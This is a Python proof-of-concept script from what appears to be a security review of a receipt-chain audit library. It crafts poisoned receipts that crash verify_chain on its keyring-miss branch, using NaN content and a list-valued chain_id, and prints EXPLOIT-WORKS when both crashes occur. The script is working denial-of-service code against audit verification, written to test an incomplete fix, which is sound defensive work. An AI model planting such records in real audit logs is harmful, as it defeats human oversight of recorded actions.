#!/usr/bin/env python3
"""poc_alpha_2 — v2.2 PARTIAL FIX: the chain_hash() crash guard added to
verify_chain's main loop was NOT applied to the keyring-miss branch. Two
keyless crash vectors survive there:

  B1: a receipt whose content canonical() rejects (NaN/Infinity — reachable
      over plain JSON transport: Python's json.loads accepts NaN) and whose
      claimed keyid is absent from the keyring -> `prev = chain_hash(r)`
      raises ValueError, batch dies.
  B2: same branch, `chain_ids.add(cid)` with a NON-STRING chain_id (e.g. a
      list) -> TypeError (unhashable). The main loop got an isinstance check
      in v2.2 ("chain_id not a string — malformed"); this branch did not.

A multi-signer audit (keyring path) is therefore still one planted record
away from total denial — F6's "never a batch crash" holds only on the
single-signer path.
"""
import sys, json, copy, traceback
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, chain_hash, generate_keypair, keyid,
                         verify_chain, verify_receipt, sha256_hex)

SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
       "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
CID = "chain:prod-0001"

sk, pk = generate_keypair()
r1 = build_receipt(action_id="a-001", subject_name="prod:svc", actor=SVC,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk, chain_id=CID)

# Control: the SAME poison on the single-signer path is now handled (v2.2 guard).
poison = copy.deepcopy(r1)
poison["predicate"]["action_id"] = "a-002"
poison["predicate"]["execution"]["latency_ms"] = float("nan")
poison = json.loads(json.dumps(poison))  # JSON round-trip preserves NaN in Python
out = verify_chain([r1, poison], pk)
main_path_graceful = out["verdicts"][1]["verdict"] == "FAIL"
print(f"[*] control: single-signer path handles NaN poison gracefully: {main_path_graceful}")

crash_b1 = False
try:
    verify_chain([r1, poison], public_key=None, keyring={"someone-else": pk})
except ValueError as e:
    crash_b1 = True
    print(f"[!] B1: keyring-miss branch crashed on NaN content: {type(e).__name__}: {e}")

r2 = build_receipt(action_id="a-002", subject_name="prod:svc", actor=SVC,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash=chain_hash(r1), signing_key=sk, chain_id=CID)
p2 = copy.deepcopy(r2)
p2["predicate"]["chain_id"] = ["chain:x"]            # non-string, unhashable
p2["signatures"] = [{"keyid": "unknown-kid", "sig": "AAAA"}]
crash_b2 = False
try:
    verify_chain([r1, p2], public_key=None, keyring={"someone-else": pk})
except TypeError as e:
    crash_b2 = True
    print(f"[!] B2: keyring-miss branch crashed on list chain_id: {type(e).__name__}: {e}")

print("EXPLOIT-WORKS" if (crash_b1 and crash_b2 and main_path_graceful) else "HELD")
